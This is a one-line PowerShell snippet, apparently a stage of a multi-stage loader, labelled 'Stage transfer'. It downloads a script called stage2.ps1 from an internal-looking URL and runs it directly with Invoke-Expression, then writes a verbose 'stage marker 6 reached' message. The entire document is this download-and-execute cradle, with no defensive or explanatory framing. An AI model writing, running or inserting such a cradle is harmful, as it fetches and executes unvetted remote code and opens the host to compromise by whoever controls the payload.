
<# Stage transfer #> $PayloadUrl = 'https://internal.corp/stage2.ps1'; Invoke-Expression (New-Object System.Net.WebClient).DownloadString($PayloadUrl); Write-Verbose "stage marker 6 reached"
